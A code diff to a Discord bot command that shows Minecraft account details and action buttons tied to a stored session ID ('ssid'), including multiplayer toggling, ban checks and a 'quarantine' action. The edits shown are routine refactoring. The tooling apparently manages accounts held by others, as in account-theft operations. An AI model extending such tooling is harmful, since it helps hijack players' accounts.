@@ -37,9 +37,29 @@ module.exports = {
         mcitems
       } = result[0];
 
-            capes = JSON.parse(capes)
+      let capesList = [];
+      if (capes) {
+        try {
+          capesList = typeof capes === 'string' ? JSON.parse(capes) : capes;
+          if (typeof capesList === 'string') capesList = JSON.parse(capesList);
+        } catch {
+          capesList = [];
+        }
+      }
+      if (!Array.isArray(capesList)) capesList = [];
+      capes = capesList;
 
-      mcitems = JSON.parse(mcitems);
+      let mcitemsList = [];
+      if (mcitems) {
+        try {
+          mcitemsList = typeof mcitems === 'string' ? JSON.parse(mcitems) : mcitems;
+          if (typeof mcitemsList === 'string') mcitemsList = JSON.parse(mcitemsList);
+        } catch {
+          mcitemsList = [];
+        }
+      }
+      if (!Array.isArray(mcitemsList)) mcitemsList = [];
+      mcitems = mcitemsList;
 
       await client.queryParams(
         `INSERT INTO actions(id, action) VALUES(?, ?)`,
@@ -67,16 +87,6 @@ module.exports = {
         `INSERT INTO actions(id, action) VALUES(?, ?)`,
         [secureId6, `quarantinemc|${ssid}`]
       );
-
-      let lunarCosmetics = "No cosmetics";
-      if (lunar) {
-        try {
-          const lunarData = JSON.parse(lunar);
-          lunarCosmetics = `${lunarData.cosamount || 0} cosmetics`;
-        } catch (e) {
-          console.error("Error parsing lunar cosmetics:", e);
-        }
-      }
 
       const { redeemedCapes } = parsePurchases(result[0].purchases);
       const capesString = Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None";
@@ -135,7 +145,6 @@ const embed = new EmbedBuilder()
   .setTitle(`Minecraft info for: ${username || "Unknown"}`)
   .addFields(
     { name: "Owns Minecraft", value: `\`\`\`${ownsMinecraftDisplay}\`\`\``, inline: true },
-    { name: "Lunar Cosmetics", value: `\`\`\`${lunarCosmetics}\`\`\``, inline: true },
     { name: "Capes (Java)", value: `\`\`\`${capesString}\`\`\``, inline: true },
     { name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesString}\`\`\``, inline: true },
     { name: "Changed Username", value: `\`\`\`${changedusername === "1" || changedusername === 1 ? "Yes" : "No"}\`\`\``, inline: true },
@@ -150,20 +159,9 @@ const embed = new EmbedBuilder()
 
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
-          .setCustomId(`lunarcosmetics|${uid}`)
-          .setLabel('Lunar cosmetics')
-          .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-          .setCustomId(`labymod|${uid}`)
-          .setLabel('Laby cosmetics')
-          .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
           .setCustomId(`action|${secureId4}`)
           .setLabel('Optifine Cape')
-          .setStyle(ButtonStyle.Primary)
-      );
-
-      const row2 = new ActionRowBuilder().addComponents(
+          .setStyle(ButtonStyle.Primary),
         new ButtonBuilder()
           .setCustomId(`action|${secureId}`)
           .setLabel('Enable Multiplayer')
@@ -178,28 +176,29 @@ const embed = new EmbedBuilder()
           .setStyle(ButtonStyle.Primary)
       );
 
-      const row3 = new ActionRowBuilder().addComponents(
-          new ButtonBuilder()
+      const row2 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
           .setCustomId(`action|${secureId5}`)
           .setLabel('Check Ban')
           .setStyle(ButtonStyle.Primary), 
-          new ButtonBuilder()
+        new ButtonBuilder()
           .setCustomId(`action|${secureId6}`)
           .setLabel('Add to Quarantine')
           .setStyle(ButtonStyle.Primary)
-      )
+      );
 
       return interaction.reply({
         embeds: [embed],
-        components: [row, row2, row3],
+        components: [row, row2],
         ephemeral: true
       });
     } catch (error) {
       console.error("Error fetching minecraft info:", error);
-      return interaction.reply({
+      const method = (interaction.deferred || interaction.replied) ? 'followUp' : 'reply';
+      return interaction[method]({
         content: "An error occurred while fetching Minecraft information.",
         ephemeral: true
-      });
+      }).catch(() => {});
     }
   }
 };
